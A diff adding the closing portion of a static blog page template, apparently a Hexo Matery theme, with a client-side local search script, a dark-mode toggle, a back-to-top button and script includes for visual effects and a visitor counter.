+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
